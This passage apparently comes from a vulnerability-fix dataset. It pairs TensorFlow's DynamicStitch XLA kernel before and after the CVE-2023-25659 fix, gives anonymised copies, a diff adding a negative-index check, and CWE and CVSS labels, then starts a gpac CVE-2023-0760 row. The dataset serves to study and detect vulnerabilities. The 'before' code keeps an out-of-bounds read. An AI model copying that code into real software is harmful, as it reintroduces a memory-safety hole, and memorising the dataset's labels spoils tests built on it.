          VAR_7 == 0 || SameExtraShape(VAR_5, VAR_6,
                                           VAR_9, VAR_8),
          errors::InvalidArgument(
              ""Need data[0].shape["", VAR_6.dims(), "":] = data["",
              VAR_7, ""].shape["", VAR_8.dims(),
              "":], got data[0].shape = "", VAR_5.DebugString(), "", data["",
              VAR_7, ""].shape = "", VAR_9.DebugString(),
              "", indices[0].shape = "", VAR_6.DebugString(),
              "", indices["", VAR_7,
              ""].shape = "", VAR_8.DebugString()));

      OP_REQUIRES_OK(VAR_0,
                     XlaHelpers::ReshapeLiteral(VAR_1[VAR_7],
                                                {VAR_8.num_elements()},
                                                &VAR_4[VAR_7]));
    }

    /* COMMENT_4 */
    /* COMMENT_5 */
    /* COMMENT_6 */
    /* COMMENT_7 */
    /* COMMENT_8 */
    /* COMMENT_9 */
    /* COMMENT_10 */
    /* COMMENT_11 */
    int VAR_11 = -1;
    for (int VAR_7 = 0; VAR_7 < VAR_4.size(); VAR_7++) {
      for (int VAR_10 = 0; VAR_10 < VAR_4[VAR_7].shape().dimensions(0); ++VAR_10) {
        VAR_11 = std::max(VAR_11, VAR_4[VAR_7].Get<int>({VAR_10}));
      }
    }
    int VAR_12 = VAR_11 + 1;
    int64_t VAR_13 = 1 + VAR_5.dims() - VAR_6.dims();
    if (VAR_12 == 0) {
      std::vector<int64_t> result_shape(result_rank);
      for (int VAR_14 = VAR_6.dims(); VAR_14 < VAR_5.dims(); VAR_14++) {
        VAR_15[VAR_14 - VAR_6.dims() + 1] = VAR_5.dim_size(VAR_14);
      }
      xla::PrimitiveType VAR_16 =
          VAR_0->input_xla_type(VAR_0->num_inputs() - 1);
      xla::Literal VAR_17 = xla::Literal::CreateFromShape(
          xla::ShapeUtil::MakeShape(VAR_16, VAR_15));
      VAR_0->SetOutput(0, xla::ConstantLiteral(VAR_0->builder(), VAR_17));
      return;
    }

    /* COMMENT_12 */
    /* COMMENT_13 */
    std::vector<int32> src_input_vector(number_of_indices);
    std::vector<int32> src_slice_vector(number_of_indices);
    std::vector<bool> src_index_used(number_of_indices);
    int VAR_18 = 0;
    for (int VAR_7 = 0; VAR_7 < VAR_4.size(); VAR_7++) {
      for (int VAR_10 = 0; VAR_10 < VAR_4[VAR_7].shape().dimensions(0); ++VAR_10) {
        int VAR_19 = VAR_4[VAR_7].Get<int>({VAR_10});
        OP_REQUIRES(
            VAR_0, VAR_19 >= 0,
            errors::InvalidArgument(""indices["", VAR_19, ""] is out of range""));

        VAR_20[VAR_19] = VAR_7;
        VAR_21[VAR_19] = VAR_10;
        if (!VAR_22[VAR_19]) {
          VAR_22[VAR_19] = true;
          ++VAR_18;
        }
      }
    }
    OP_REQUIRES(VAR_0, VAR_18 == number_of_indices,
                errors::InvalidArgument(""not all indices are used""));

    /* COMMENT_14 */
    /* COMMENT_15 */
    std::vector<xla::XlaOp> VAR_23(VAR_4.size());
    for (int VAR_7 = 0; VAR_7 < VAR_4.size(); VAR_7++) {
      TensorShape VAR_24;
      /* COMMENT_16 */
      VAR_24.AddDim(VAR_4[VAR_7].shape().dimensions(0));
      /* COMMENT_17 */
      for (int VAR_14 = VAR_6.dims(); VAR_14 < VAR_5.dims(); VAR_14++) {
        VAR_24.AddDim(VAR_5.dim_size(VAR_14));
      }
      /* COMMENT_18 */
      auto VAR_25 = VAR_2[VAR_7];
      if (VAR_24 == VAR_3[VAR_7]) {
        VAR_23[VAR_7] = VAR_25;
      } else {
        VAR_23[VAR_7] = xla::Reshape(VAR_25, VAR_24.dim_sizes());
      }
    }

    /* COMMENT_19 */
    /* COMMENT_20 */
    std::vector<int64_t> slice_start(result_rank);
    std::vector<int64_t> slice_limit(result_rank);
    std::vector<int64_t> VAR_26(result_rank, 1);
    for (int VAR_14 = VAR_6.dims(); VAR_14 < VAR_5.dims(); VAR_14++) {
      VAR_27[1 + VAR_14 - VAR_6.dims()] = VAR_5.dim_size(VAR_14);
    }
    std::vector<xla::XlaOp> to_concat(number_of_indices);
    for (int VAR_28 = 0; VAR_28 < number_of_indices; VAR_28++) {
      const auto& VAR_29 = VAR_23[VAR_20[VAR_28]];
      /* COMMENT_21 */
      VAR_30[0] = VAR_21[VAR_28];
      VAR_27[0] = VAR_21[VAR_28] + 1;
      /* COMMENT_22 */
      /* COMMENT_23 */
      VAR_31[VAR_28] =
          xla::Slice(VAR_29, VAR_30, VAR_27, VAR_26);
    }

    VAR_0->SetOutput(0, xla::ConcatInDim(VAR_0->builder(), VAR_31, 0));
  }",,"--- func_before
+++ func_after
@@ -92,6 +92,10 @@
     for (int input_num = 0; input_num < indices.size(); input_num++) {
       for (int i = 0; i < indices[input_num].shape().dimensions(0); ++i) {
         int index = indices[input_num].Get<int>({i});
+        OP_REQUIRES(
+            ctx, index >= 0,
+            errors::InvalidArgument(""indices["", index, ""] is out of range""));
+
         src_input_vector[index] = input_num;
         src_slice_vector[index] = i;
         if (!src_index_used[index]) {","{'deleted_lines': [], 'added_lines': ['        OP_REQUIRES(', '            ctx, index >= 0,', '            errors::InvalidArgument(""indices["", index, ""] is out of range""));', '']}",True,"TensorFlow is an open source platform for machine learning. Prior to versions 2.12.0 and 2.11.1, if the parameter `indices` for `DynamicStitch` does not match the shape of the parameter `data`, it can trigger an stack OOB read. A fix is included in TensorFlow version 2.12.0 and version 2.11.1.
",7.5,HIGH,2,valid,2023-02-01T22:09:32Z,4
CVE-2023-25659,['CWE-125'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H,1,tensorflow,"Add out of bounds array check to dynamic_stitch_op.

PiperOrigin-RevId: 506418249",ee004b18b976eeb5a758020af8880236cd707d05,https://github.com/tensorflow/tensorflow/commit/ee004b18b976eeb5a758020af8880236cd707d05,tensorflow/compiler/tf2xla/kernels/dynamic_stitch_op.cc,Compile,"void Compile(XlaOpKernelContext* ctx) override {
std::vector<xla::Literal> indices_input;
OP_REQUIRES_OK(ctx, ctx->ConstantInputList(""indices"", &indices_input));
std::vector<xla::XlaOp> data;
std::vector<TensorShape> data_shapes;
OP_REQUIRES_OK(ctx, ctx->InputList(""data"", &data, &data_shapes));
std::vector<xla::Literal> indices(indices_input.size());
const TensorShape& data0_shape = data_shapes[0];
TensorShape indices0_shape;
OP_REQUIRES_OK(
ctx, XLAShapeToTensorShape(indices_input[0].shape(), &indices0_shape));
for (int input_num = 0; input_num < indices_input.size(); input_num++) {
TensorShape indices_shape;
OP_REQUIRES_OK(ctx,
XLAShapeToTensorShape(indices_input[input_num].shape(),
&indices_shape));
TensorShape& data_shape = data_shapes[input_num];
if (!TensorShapeUtils::StartsWith(data_shape, indices_shape)) {
for (int64_t i = 0; i < indices_shape.dims(); ++i) {
data_shape.set_dim(i, indices_shape.dim_size(i));
data[input_num] = xla::SliceInDim(data[input_num], 0,
indices_shape.dim_size(i), 1, i);
}
}
OP_REQUIRES(
ctx, TensorShapeUtils::StartsWith(data_shape, indices_shape),
errors::InvalidArgument(""data["", input_num,
""].shape = "", data_shape.DebugString(),
"" does not start with indices["", input_num,
""].shape = "", indices_shape.DebugString()));
OP_REQUIRES(
ctx,
input_num == 0 || SameExtraShape(data0_shape, indices0_shape,
data_shape, indices_shape),
errors::InvalidArgument(
""Need data[0].shape["", indices0_shape.dims(), "":] = data["",
input_num, ""].shape["", indices_shape.dims(),
"":], got data[0].shape = "", data0_shape.DebugString(), "", data["",
input_num, ""].shape = "", data_shape.DebugString(),
"", indices[0].shape = "", indices0_shape.DebugString(),
"", indices["", input_num,
""].shape = "", indices_shape.DebugString()));
OP_REQUIRES_OK(ctx,
XlaHelpers::ReshapeLiteral(indices_input[input_num],
{indices_shape.num_elements()},
&indices[input_num]));
}
int max_index = -1;
for (int input_num = 0; input_num < indices.size(); input_num++) {
for (int i = 0; i < indices[input_num].shape().dimensions(0); ++i) {
max_index = std::max(max_index, indices[input_num].Get<int>({i}));
}
}
int number_of_indices = max_index + 1;
int64_t result_rank = 1 + data0_shape.dims() - indices0_shape.dims();
if (number_of_indices == 0) {
std::vector<int64_t> result_shape(result_rank);
for (int d = indices0_shape.dims(); d < data0_shape.dims(); d++) {
result_shape[d - indices0_shape.dims() + 1] = data0_shape.dim_size(d);
}
xla::PrimitiveType element_type =
ctx->input_xla_type(ctx->num_inputs() - 1);
xla::Literal empty_literal = xla::Literal::CreateFromShape(
xla::ShapeUtil::MakeShape(element_type, result_shape));
ctx->SetOutput(0, xla::ConstantLiteral(ctx->builder(), empty_literal));
return;
}
std::vector<int32> src_input_vector(number_of_indices);
std::vector<int32> src_slice_vector(number_of_indices);
std::vector<bool> src_index_used(number_of_indices);
int index_used_count = 0;
for (int input_num = 0; input_num < indices.size(); input_num++) {
for (int i = 0; i < indices[input_num].shape().dimensions(0); ++i) {
int index = indices[input_num].Get<int>({i});
src_input_vector[index] = input_num;
src_slice_vector[index] = i;
if (!src_index_used[index]) {
src_index_used[index] = true;
++index_used_count;
}
}
}
OP_REQUIRES(ctx, index_used_count == number_of_indices,
errors::InvalidArgument(""not all indices are used""));
std::vector<xla::XlaOp> input(indices.size());
for (int input_num = 0; input_num < indices.size(); input_num++) {
TensorShape new_shape;
new_shape.AddDim(indices[input_num].shape().dimensions(0));
for (int d = indices0_shape.dims(); d < data0_shape.dims(); d++) {
new_shape.AddDim(data0_shape.dim_size(d));
}
auto handle = data[input_num];
if (new_shape == data_shapes[input_num]) {
input[input_num] = handle;
} else {
input[input_num] = xla::Reshape(handle, new_shape.dim_sizes());
}
}
std::vector<int64_t> slice_start(result_rank);
std::vector<int64_t> slice_limit(result_rank);
std::vector<int64_t> stride(result_rank, 1);
for (int d = indices0_shape.dims(); d < data0_shape.dims(); d++) {
slice_limit[1 + d - indices0_shape.dims()] = data0_shape.dim_size(d);
}
std::vector<xla::XlaOp> to_concat(number_of_indices);
for (int index_num = 0; index_num < number_of_indices; index_num++) {
const auto& expression = input[src_input_vector[index_num]];
slice_start[0] = src_slice_vector[index_num];
slice_limit[0] = src_slice_vector[index_num] + 1;
to_concat[index_num] =
xla::Slice(expression, slice_start, slice_limit, stride);
}
ctx->SetOutput(0, xla::ConcatInDim(ctx->builder(), to_concat, 0));
}","void Compile(XlaOpKernelContext* VAR_0) override {
std::vector<xla::Literal> VAR_1;
OP_REQUIRES_OK(VAR_0, VAR_0->ConstantInputList(""indices"", &VAR_1));
std::vector<xla::XlaOp> VAR_2;
std::vector<TensorShape> VAR_3;
OP_REQUIRES_OK(VAR_0, VAR_0->InputList(""data"", &VAR_2, &VAR_3));
std::vector<xla::Literal> VAR_4(VAR_1.size());
const TensorShape& VAR_5 = VAR_3[0];
TensorShape VAR_6;
OP_REQUIRES_OK(
VAR_0, XLAShapeToTensorShape(VAR_1[0].shape(), &VAR_6));
for (int VAR_7 = 0; VAR_7 < VAR_1.size(); VAR_7++) {
TensorShape VAR_8;
OP_REQUIRES_OK(VAR_0,
XLAShapeToTensorShape(VAR_1[VAR_7].shape(),
&VAR_8));
TensorShape& VAR_9 = VAR_3[VAR_7];
if (!TensorShapeUtils::StartsWith(VAR_9, VAR_8)) {
for (int64_t VAR_10 = 0; VAR_10 < VAR_8.dims(); ++VAR_10) {
VAR_9.set_dim(VAR_10, VAR_8.dim_size(VAR_10));
VAR_2[VAR_7] = xla::SliceInDim(VAR_2[VAR_7], 0,
VAR_8.dim_size(VAR_10), 1, VAR_10);
}
}
OP_REQUIRES(
VAR_0, TensorShapeUtils::StartsWith(VAR_9, VAR_8),
errors::InvalidArgument(""data["", VAR_7,
""].shape = "", VAR_9.DebugString(),
"" does not start with indices["", VAR_7,
""].shape = "", VAR_8.DebugString()));
OP_REQUIRES(
VAR_0,
VAR_7 == 0 || SameExtraShape(VAR_5, VAR_6,
VAR_9, VAR_8),
errors::InvalidArgument(
""Need data[0].shape["", VAR_6.dims(), "":] = data["",
VAR_7, ""].shape["", VAR_8.dims(),
"":], got data[0].shape = "", VAR_5.DebugString(), "", data["",
VAR_7, ""].shape = "", VAR_9.DebugString(),
"", indices[0].shape = "", VAR_6.DebugString(),
"", indices["", VAR_7,
""].shape = "", VAR_8.DebugString()));
OP_REQUIRES_OK(VAR_0,
XlaHelpers::ReshapeLiteral(VAR_1[VAR_7],
{VAR_8.num_elements()},
&VAR_4[VAR_7]));
}
int VAR_11 = -1;
for (int VAR_7 = 0; VAR_7 < VAR_4.size(); VAR_7++) {
for (int VAR_10 = 0; VAR_10 < VAR_4[VAR_7].shape().dimensions(0); ++VAR_10) {
VAR_11 = std::max(VAR_11, VAR_4[VAR_7].Get<int>({VAR_10}));
}
}
int VAR_12 = VAR_11 + 1;
int64_t VAR_13 = 1 + VAR_5.dims() - VAR_6.dims();
if (VAR_12 == 0) {
std::vector<int64_t> result_shape(result_rank);
for (int VAR_14 = VAR_6.dims(); VAR_14 < VAR_5.dims(); VAR_14++) {
VAR_15[VAR_14 - VAR_6.dims() + 1] = VAR_5.dim_size(VAR_14);
}
xla::PrimitiveType VAR_16 =
VAR_0->input_xla_type(VAR_0->num_inputs() - 1);
xla::Literal VAR_17 = xla::Literal::CreateFromShape(
xla::ShapeUtil::MakeShape(VAR_16, VAR_15));
VAR_0->SetOutput(0, xla::ConstantLiteral(VAR_0->builder(), VAR_17));
return;
}
std::vector<int32> src_input_vector(number_of_indices);
std::vector<int32> src_slice_vector(number_of_indices);
std::vector<bool> src_index_used(number_of_indices);
int VAR_18 = 0;
for (int VAR_7 = 0; VAR_7 < VAR_4.size(); VAR_7++) {
for (int VAR_10 = 0; VAR_10 < VAR_4[VAR_7].shape().dimensions(0); ++VAR_10) {
int VAR_19 = VAR_4[VAR_7].Get<int>({VAR_10});
VAR_20[VAR_19] = VAR_7;
VAR_21[VAR_19] = VAR_10;
if (!VAR_22[VAR_19]) {
VAR_22[VAR_19] = true;
++VAR_18;
}
}
}
OP_REQUIRES(VAR_0, VAR_18 == number_of_indices,
errors::InvalidArgument(""not all indices are used""));
std::vector<xla::XlaOp> VAR_23(VAR_4.size());
for (int VAR_7 = 0; VAR_7 < VAR_4.size(); VAR_7++) {
TensorShape VAR_24;
VAR_24.AddDim(VAR_4[VAR_7].shape().dimensions(0));
for (int VAR_14 = VAR_6.dims(); VAR_14 < VAR_5.dims(); VAR_14++) {
VAR_24.AddDim(VAR_5.dim_size(VAR_14));
}
auto VAR_25 = VAR_2[VAR_7];
if (VAR_24 == VAR_3[VAR_7]) {
VAR_23[VAR_7] = VAR_25;
} else {
VAR_23[VAR_7] = xla::Reshape(VAR_25, VAR_24.dim_sizes());
}
}
std::vector<int64_t> slice_start(result_rank);
std::vector<int64_t> slice_limit(result_rank);
std::vector<int64_t> VAR_26(result_rank, 1);
for (int VAR_14 = VAR_6.dims(); VAR_14 < VAR_5.dims(); VAR_14++) {
VAR_27[1 + VAR_14 - VAR_6.dims()] = VAR_5.dim_size(VAR_14);
}
std::vector<xla::XlaOp> to_concat(number_of_indices);
for (int VAR_28 = 0; VAR_28 < number_of_indices; VAR_28++) {
const auto& VAR_29 = VAR_23[VAR_20[VAR_28]];
VAR_30[0] = VAR_21[VAR_28];
VAR_27[0] = VAR_21[VAR_28] + 1;
VAR_31[VAR_28] =
xla::Slice(VAR_29, VAR_30, VAR_27, VAR_26);
}
VAR_0->SetOutput(0, xla::ConcatInDim(VAR_0->builder(), VAR_31, 0));
}",,"void Compile(XlaOpKernelContext* ctx) override {
    // Validate that data_shape[i] = indices[i].shape() + constant
    std::vector<xla::Literal> indices_input;
    OP_REQUIRES_OK(ctx, ctx->ConstantInputList(""indices"", &indices_input));

    std::vector<xla::XlaOp> data;
    std::vector<TensorShape> data_shapes;
    OP_REQUIRES_OK(ctx, ctx->InputList(""data"", &data, &data_shapes));

    std::vector<xla::Literal> indices(indices_input.size());

    const TensorShape& data0_shape = data_shapes[0];
    TensorShape indices0_shape;
    OP_REQUIRES_OK(
        ctx, XLAShapeToTensorShape(indices_input[0].shape(), &indices0_shape));
    for (int input_num = 0; input_num < indices_input.size(); input_num++) {
      TensorShape indices_shape;
      OP_REQUIRES_OK(ctx,
                     XLAShapeToTensorShape(indices_input[input_num].shape(),
                                           &indices_shape));
      TensorShape& data_shape = data_shapes[input_num];
      if (!TensorShapeUtils::StartsWith(data_shape, indices_shape)) {
        // This happens when data shape is a dynamic shape with bound with
        // indices_shape is a concrete shape. We use slice to reconcile the
        // mismatch.
        for (int64_t i = 0; i < indices_shape.dims(); ++i) {
          data_shape.set_dim(i, indices_shape.dim_size(i));
          data[input_num] = xla::SliceInDim(data[input_num], 0,
                                            indices_shape.dim_size(i), 1, i);
        }
      }
      OP_REQUIRES(
          ctx, TensorShapeUtils::StartsWith(data_shape, indices_shape),
          errors::InvalidArgument(""data["", input_num,
                                  ""].shape = "", data_shape.DebugString(),
                                  "" does not start with indices["", input_num,
                                  ""].shape = "", indices_shape.DebugString()));
      OP_REQUIRES(
          ctx,
          input_num == 0 || SameExtraShape(data0_shape, indices0_shape,
                                           data_shape, indices_shape),
          errors::InvalidArgument(
              ""Need data[0].shape["", indices0_shape.dims(), "":] = data["",
              input_num, ""].shape["", indices_shape.dims(),
              "":], got data[0].shape = "", data0_shape.DebugString(), "", data["",
              input_num, ""].shape = "", data_shape.DebugString(),
              "", indices[0].shape = "", indices0_shape.DebugString(),
              "", indices["", input_num,
              ""].shape = "", indices_shape.DebugString()));

      OP_REQUIRES_OK(ctx,
                     XlaHelpers::ReshapeLiteral(indices_input[input_num],
                                                {indices_shape.num_elements()},
                                                &indices[input_num]));
    }

    // Find which slice will be used for each index. If the same index
    // appears in multiple inputs, the last one is used. The logic
    // here is different from that in third_party/tensorflow because
    // it is important for XLA that there be a well-formed Concat
    // operation at the end. The existing CPU/GPU code copies multiple
    // source slices to the same destination slice if there are
    // repeated indices, whereas the XLA code works out which
    // source slice will 'win' and only uses that in the Concat.
    int max_index = -1;
    for (int input_num = 0; input_num < indices.size(); input_num++) {
      for (int i = 0; i < indices[input_num].shape().dimensions(0); ++i) {
        max_index = std::max(max_index, indices[input_num].Get<int>({i}));
      }
    }
    int number_of_indices = max_index + 1;
    int64_t result_rank = 1 + data0_shape.dims() - indices0_shape.dims();
    if (number_of_indices == 0) {
      std::vector<int64_t> result_shape(result_rank);
      for (int d = indices0_shape.dims(); d < data0_shape.dims(); d++) {
        result_shape[d - indices0_shape.dims() + 1] = data0_shape.dim_size(d);
      }
      xla::PrimitiveType element_type =
          ctx->input_xla_type(ctx->num_inputs() - 1);
      xla::Literal empty_literal = xla::Literal::CreateFromShape(
          xla::ShapeUtil::MakeShape(element_type, result_shape));
      ctx->SetOutput(0, xla::ConstantLiteral(ctx->builder(), empty_literal));
      return;
    }

    // Construct the reverse mapping, for each index, of which slice of which
    // input it comes from.
    std::vector<int32> src_input_vector(number_of_indices);
    std::vector<int32> src_slice_vector(number_of_indices);
    std::vector<bool> src_index_used(number_of_indices);
    int index_used_count = 0;
    for (int input_num = 0; input_num < indices.size(); input_num++) {
      for (int i = 0; i < indices[input_num].shape().dimensions(0); ++i) {
        int index = indices[input_num].Get<int>({i});
        OP_REQUIRES(
            ctx, index >= 0,
            errors::InvalidArgument(""indices["", index, ""] is out of range""));

        src_input_vector[index] = input_num;
        src_slice_vector[index] = i;
        if (!src_index_used[index]) {
          src_index_used[index] = true;
          ++index_used_count;
        }
      }
    }
    OP_REQUIRES(ctx, index_used_count == number_of_indices,
                errors::InvalidArgument(""not all indices are used""));

    // Look up all the children expressions that represent the data
    // inputs.
    std::vector<xla::XlaOp> input(indices.size());
    for (int input_num = 0; input_num < indices.size(); input_num++) {
      TensorShape new_shape;
      // first reshaped dimension is the number of indices for this input.
      new_shape.AddDim(indices[input_num].shape().dimensions(0));
      // Then the rest are the common extra shape.
      for (int d = indices0_shape.dims(); d < data0_shape.dims(); d++) {
        new_shape.AddDim(data0_shape.dim_size(d));
      }
      // Get the data, shaped appropriately.
      auto handle = data[input_num];
      if (new_shape == data_shapes[input_num]) {
        input[input_num] = handle;
      } else {
        input[input_num] = xla::Reshape(handle, new_shape.dim_sizes());
      }
    }

    // Set up the vectors for slicing: the first dimension will vary
    // slice by slice, and the rest take the full common extra shape.
    std::vector<int64_t> slice_start(result_rank);
    std::vector<int64_t> slice_limit(result_rank);
    std::vector<int64_t> stride(result_rank, 1);
    for (int d = indices0_shape.dims(); d < data0_shape.dims(); d++) {
      slice_limit[1 + d - indices0_shape.dims()] = data0_shape.dim_size(d);
    }
    std::vector<xla::XlaOp> to_concat(number_of_indices);
    for (int index_num = 0; index_num < number_of_indices; index_num++) {
      const auto& expression = input[src_input_vector[index_num]];
      // Take the appropriate slice of data.
      slice_start[0] = src_slice_vector[index_num];
      slice_limit[0] = src_slice_vector[index_num] + 1;
      // And place it in the concat list in the place indicated by
      // the index.
      to_concat[index_num] =
          xla::Slice(expression, slice_start, slice_limit, stride);
    }

    ctx->SetOutput(0, xla::ConcatInDim(ctx->builder(), to_concat, 0));
  }","void Compile(XlaOpKernelContext* VAR_0) override {
    /* COMMENT_0 */
    std::vector<xla::Literal> VAR_1;
    OP_REQUIRES_OK(VAR_0, VAR_0->ConstantInputList(""indices"", &VAR_1));

    std::vector<xla::XlaOp> VAR_2;
    std::vector<TensorShape> VAR_3;
    OP_REQUIRES_OK(VAR_0, VAR_0->InputList(""data"", &VAR_2, &VAR_3));

    std::vector<xla::Literal> VAR_4(VAR_1.size());

    const TensorShape& VAR_5 = VAR_3[0];
    TensorShape VAR_6;
    OP_REQUIRES_OK(
        VAR_0, XLAShapeToTensorShape(VAR_1[0].shape(), &VAR_6));
    for (int VAR_7 = 0; VAR_7 < VAR_1.size(); VAR_7++) {
      TensorShape VAR_8;
      OP_REQUIRES_OK(VAR_0,
                     XLAShapeToTensorShape(VAR_1[VAR_7].shape(),
                                           &VAR_8));
      TensorShape& VAR_9 = VAR_3[VAR_7];
      if (!TensorShapeUtils::StartsWith(VAR_9, VAR_8)) {
        /* COMMENT_1 */
        /* COMMENT_2 */
        /* COMMENT_3 */
        for (int64_t VAR_10 = 0; VAR_10 < VAR_8.dims(); ++VAR_10) {
          VAR_9.set_dim(VAR_10, VAR_8.dim_size(VAR_10));
          VAR_2[VAR_7] = xla::SliceInDim(VAR_2[VAR_7], 0,
                                            VAR_8.dim_size(VAR_10), 1, VAR_10);
        }
      }
      OP_REQUIRES(
          VAR_0, TensorShapeUtils::StartsWith(VAR_9, VAR_8),
          errors::InvalidArgument(""data["", VAR_7,
                                  ""].shape = "", VAR_9.DebugString(),
                                  "" does not start with indices["", VAR_7,
                                  ""].shape = "", VAR_8.DebugString()));
      OP_REQUIRES(
          VAR_0,
          VAR_7 == 0 || SameExtraShape(VAR_5, VAR_6,
                                           VAR_9, VAR_8),
          errors::InvalidArgument(
              ""Need data[0].shape["", VAR_6.dims(), "":] = data["",
              VAR_7, ""].shape["", VAR_8.dims(),
              "":], got data[0].shape = "", VAR_5.DebugString(), "", data["",
              VAR_7, ""].shape = "", VAR_9.DebugString(),
              "", indices[0].shape = "", VAR_6.DebugString(),
              "", indices["", VAR_7,
              ""].shape = "", VAR_8.DebugString()));

      OP_REQUIRES_OK(VAR_0,
                     XlaHelpers::ReshapeLiteral(VAR_1[VAR_7],
                                                {VAR_8.num_elements()},
                                                &VAR_4[VAR_7]));
    }

    /* COMMENT_4 */
    /* COMMENT_5 */
    /* COMMENT_6 */
    /* COMMENT_7 */
    /* COMMENT_8 */
    /* COMMENT_9 */
    /* COMMENT_10 */
    /* COMMENT_11 */
    int VAR_11 = -1;
    for (int VAR_7 = 0; VAR_7 < VAR_4.size(); VAR_7++) {
      for (int VAR_10 = 0; VAR_10 < VAR_4[VAR_7].shape().dimensions(0); ++VAR_10) {
        VAR_11 = std::max(VAR_11, VAR_4[VAR_7].Get<int>({VAR_10}));
      }
    }
    int VAR_12 = VAR_11 + 1;
    int64_t VAR_13 = 1 + VAR_5.dims() - VAR_6.dims();
    if (VAR_12 == 0) {
      std::vector<int64_t> result_shape(result_rank);
      for (int VAR_14 = VAR_6.dims(); VAR_14 < VAR_5.dims(); VAR_14++) {
        VAR_15[VAR_14 - VAR_6.dims() + 1] = VAR_5.dim_size(VAR_14);
      }
      xla::PrimitiveType VAR_16 =
          VAR_0->input_xla_type(VAR_0->num_inputs() - 1);
      xla::Literal VAR_17 = xla::Literal::CreateFromShape(
          xla::ShapeUtil::MakeShape(VAR_16, VAR_15));
      VAR_0->SetOutput(0, xla::ConstantLiteral(VAR_0->builder(), VAR_17));
      return;
    }

    /* COMMENT_12 */
    /* COMMENT_13 */
    std::vector<int32> src_input_vector(number_of_indices);
    std::vector<int32> src_slice_vector(number_of_indices);
    std::vector<bool> src_index_used(number_of_indices);
    int VAR_18 = 0;
    for (int VAR_7 = 0; VAR_7 < VAR_4.size(); VAR_7++) {
      for (int VAR_10 = 0; VAR_10 < VAR_4[VAR_7].shape().dimensions(0); ++VAR_10) {
        int VAR_19 = VAR_4[VAR_7].Get<int>({VAR_10});
        OP_REQUIRES(
            VAR_0, VAR_19 >= 0,
            errors::InvalidArgument(""indices["", VAR_19, ""] is out of range""));

        VAR_20[VAR_19] = VAR_7;
        VAR_21[VAR_19] = VAR_10;
        if (!VAR_22[VAR_19]) {
          VAR_22[VAR_19] = true;
          ++VAR_18;
        }
      }
    }
    OP_REQUIRES(VAR_0, VAR_18 == number_of_indices,
                errors::InvalidArgument(""not all indices are used""));

    /* COMMENT_14 */
    /* COMMENT_15 */
    std::vector<xla::XlaOp> VAR_23(VAR_4.size());
    for (int VAR_7 = 0; VAR_7 < VAR_4.size(); VAR_7++) {
      TensorShape VAR_24;
      /* COMMENT_16 */
      VAR_24.AddDim(VAR_4[VAR_7].shape().dimensions(0));
      /* COMMENT_17 */
      for (int VAR_14 = VAR_6.dims(); VAR_14 < VAR_5.dims(); VAR_14++) {
        VAR_24.AddDim(VAR_5.dim_size(VAR_14));
      }
      /* COMMENT_18 */
      auto VAR_25 = VAR_2[VAR_7];
      if (VAR_24 == VAR_3[VAR_7]) {
        VAR_23[VAR_7] = VAR_25;
      } else {
        VAR_23[VAR_7] = xla::Reshape(VAR_25, VAR_24.dim_sizes());
      }
    }

    /* COMMENT_19 */
    /* COMMENT_20 */
    std::vector<int64_t> slice_start(result_rank);
    std::vector<int64_t> slice_limit(result_rank);
    std::vector<int64_t> VAR_26(result_rank, 1);
    for (int VAR_14 = VAR_6.dims(); VAR_14 < VAR_5.dims(); VAR_14++) {
      VAR_27[1 + VAR_14 - VAR_6.dims()] = VAR_5.dim_size(VAR_14);
    }
    std::vector<xla::XlaOp> to_concat(number_of_indices);
    for (int VAR_28 = 0; VAR_28 < number_of_indices; VAR_28++) {
      const auto& VAR_29 = VAR_23[VAR_20[VAR_28]];
      /* COMMENT_21 */
      VAR_30[0] = VAR_21[VAR_28];
      VAR_27[0] = VAR_21[VAR_28] + 1;
      /* COMMENT_22 */
      /* COMMENT_23 */
      VAR_31[VAR_28] =
          xla::Slice(VAR_29, VAR_30, VAR_27, VAR_26);
    }

    VAR_0->SetOutput(0, xla::ConcatInDim(VAR_0->builder(), VAR_31, 0));
  }",,"--- func_before
+++ func_after
@@ -92,6 +92,10 @@
     for (int input_num = 0; input_num < indices.size(); input_num++) {
       for (int i = 0; i < indices[input_num].shape().dimensions(0); ++i) {
         int index = indices[input_num].Get<int>({i});
+        OP_REQUIRES(
+            ctx, index >= 0,
+            errors::InvalidArgument(""indices["", index, ""] is out of range""));
+
         src_input_vector[index] = input_num;
         src_slice_vector[index] = i;
         if (!src_index_used[index]) {","{'deleted_lines': [], 'added_lines': ['        OP_REQUIRES(', '            ctx, index >= 0,', '            errors::InvalidArgument(""indices["", index, ""] is out of range""));', '']}",True,"TensorFlow is an open source platform for machine learning. Prior to versions 2.12.0 and 2.11.1, if the parameter `indices` for `DynamicStitch` does not match the shape of the parameter `data`, it can trigger an stack OOB read. A fix is included in TensorFlow version 2.12.0 and version 2.11.1.
",7.5,HIGH,2,valid,2023-02-01T22:09:32Z,4
CVE-2023-0760,['CWE-122'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H,1,gpac,sgpd box entry: disallow null grouping_type (#2389),ea7395f39f601a7750d48d606e9d10ea0b7beefe,https://github.com/gpac/gpac/commit/ea7395f39f601a7750d48d606e9d10ea0b7beefe,src/isomedia/box_funcs.c,gf_isom_box_parse_ex,"GF_Err gf_isom_box_parse_ex(GF_Box **outBox, GF_BitStream *bs, u32 parent_type, Bool is_root_box, u64 parent_size)
{
u32 type, uuid_type, hdr_size, restore_type;
u64 size, start, comp_start, end;
char uuid[16];
GF_Err e;
GF_BitStream *uncomp_bs = NULL;
u8 *uncomp_data = NULL;
u32 compressed_size=0;
GF_Box *newBox;
Bool skip_logs = (gf_bs_get_cookie(bs) & GF_ISOM_BS_COOKIE_NO_LOGS ) ? GF_TRUE : GF_FALSE;
Bool is_special = GF_TRUE;
if ((bs == NULL) || (outBox == NULL) ) return GF_BAD_PARAM;
*outBox = NULL;
if (gf_bs_available(bs) < 8) {
return GF_ISOM_INCOMPLETE_FILE;
}
comp_start = start = gf_bs_get_position(bs);
uuid_type = 0;
size = (u64) gf_bs_read_u32(bs);
hdr_size = 4;
if ((size >= 2) && (size <= 4)) {
size = 4;
type = GF_ISOM_BOX_TYPE_VOID;
} else {
type = gf_bs_read_u32(bs);
hdr_size += 4;
if (type == GF_ISOM_BOX_TYPE_TOTL)
size = 12;
if (!size) {
if (is_root_box) {
if (!skip_logs) {
GF_LOG(GF_LOG_DEBUG, GF_LOG_CONTAINER, (""[iso file] Warning Read Box type %s (0x%08X) size 0 reading till the end of file\n"", gf_4cc_to_str(type), type));
}
size = gf_bs_available(bs) + 8;
} else {
if (!skip_logs) {
